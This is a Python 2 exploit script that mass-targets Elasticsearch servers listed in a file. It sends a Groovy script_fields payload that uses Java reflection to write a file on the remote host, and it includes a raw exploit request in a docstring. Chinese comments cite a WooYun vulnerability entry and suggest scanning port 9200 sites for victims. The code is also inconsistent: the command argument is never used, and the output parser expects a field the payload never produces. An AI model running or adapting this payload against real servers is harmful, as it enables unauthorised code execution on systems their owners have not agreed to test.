#!/usr/bin/env python
# -*- coding: utf_8 -*-

import os, sys, re
import requests
from optparse import OptionParser


class ElasticSearchExp:
    def __init__(self,url_file,timeout):
        self.url_file = url_file
        self.timeout = timeout
        self.url_info = []

        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded"
        }

    def __load_target(self):
        with open(self.url_file,'rb+') as f:
            for info in f.readlines():
                if not info.startswith('#') and info.strip():
                    self.url_info.append(info.strip())

    def __check_target_available(self,url):
        try:
            result = requests.head(url,headers= self.headers,timeout= self.timeout)
            if result.status_code == 200:
                return True
        except:
            print '%s cannot access!' % url

    def __exec(self,url,cmd):
        """
        Elastic search 命令执行函数
        漏洞详情:http://zone.wooyun.org/content/18915
        测试案例:请自行扫描9200端口的网站吧。
        """
        results = []
        elastic_url = url + '_search?pretty'

        dst="/tmp/ff.txt"
        file="99999999999999"
        exp='{"size":1,' \
            '"script_fields": {"exp": {"script":"java.lang.Math.class.forName(\"java.io.FileOutputStream\").getConstructor(java.io.File.class).newInstance(java.lang.Math.class.forName(\"java.io.File\").getConstructor(java.lang.String.class).newInstance(\"' + dst + '\")).write(java.lang.Math.class.forName(\"java.lang.String\").getConstructor(java.lang.String.class).newInstance(\"' + file + '\").getBytes())","lang": "groovy"}}}'

        """
        POST //_search?pretty HTTP/1.1
User-Agent: Java/1.8.0_66
Host: 192.168.49.143:9200
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-Length: 453

{"size":1,"script_fields": {"exp": {"script":"java.lang.Math.class.forName(\"java.io.FileOutputStream\").getConstructor(java.io.File.class).newInstance(java.lang.Math.class.forName(\"java.io.File\").getConstructor(java.lang.String.class).newInstance(\"/tmp/file.txt\")).write(java.lang.Math.class.forName(\"java.lang.String\").getConstructor(java.lang.String.class).newInstance(\"8888888888888888888888888888888888888\").getBytes())","lang": "groovy"}}}
"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            content = requests.post(elastic_url, data=exp, headers=headers, timeout= self.timeout).text
        except Exception:
            print '[!] error!'
            raise SystemExit
        else:
            result = re.findall(re.compile('\"iswin\" : \[ "(.*?)" \]'), content)
            if result:
                results.append(result[0])
        return results[0].replace('\\n', '\n').replace('\\r','').replace('\\\\','\\')

    def exp(self):
        self.__load_target()

        for item in self.url_info:
            _ = item.split('|||')

            url = _[0] if _[0].endswith('/') else _[0] + '/'
            cmd = _[1]

            if self.__check_target_available(url):
                result = self.__exec(url,cmd)
                print '*'*50
                print url
                print result


if __name__ == '__main__':
    usage = 'usage: backdoor_exp [options] arg'
    parser = OptionParser(usage)
    parser.add_option('-f', '--url_file', dest = 'url_file', default = 'url.txt', help = 'the target file to pentest,defalut backdoor.txt')
    parser.add_option('--timeout', dest = 'timeout', default = 5, help = 'http timeout,default 5')

    (options, args) = parser.parse_args()

    file = options.url_file
    timeout = options.timeout

    t = ElasticSearchExp(file,timeout)
    t.exp()


